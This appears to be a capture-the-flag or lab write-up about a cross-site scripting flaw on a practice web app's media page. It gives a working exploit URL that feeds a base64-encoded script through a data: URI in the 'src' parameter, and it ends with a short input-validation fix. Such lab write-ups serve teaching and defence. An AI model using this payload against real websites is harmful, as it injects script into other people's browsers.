# XSS-Data URI Vulnerability

* Data URI is a clever method of inserting tiny files inline in HTML texts. Instead of referring to a file kept locally on the server, the file is delivered as a base64-encoded string of data prefixed by a mime-type inside the URL itself.

## Page

* Url: http://192.168.56.101/?page=media&src=nsa

## Exploitation

* Send a script in [Base 64][1] :
    ```
    <script>alert(nani)</script>
    ```

    ```
    data:[mediatype][;base64],data

    * mediatype = the media type (text/html)
    --- --- ---
    * ;base64 = specify the encoding format of the data
    --- --- ---
    * ,data = the malicious code
    ```

 *  Exploit
    ```
    http://192.168.56.105/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydChuYW5pKTwvc2NyaXB0Pg==
    ```


## Solution

* Do not trust the user input. The user data should be filtered and validated, by escaping characters or preventing the use of certain symbols.
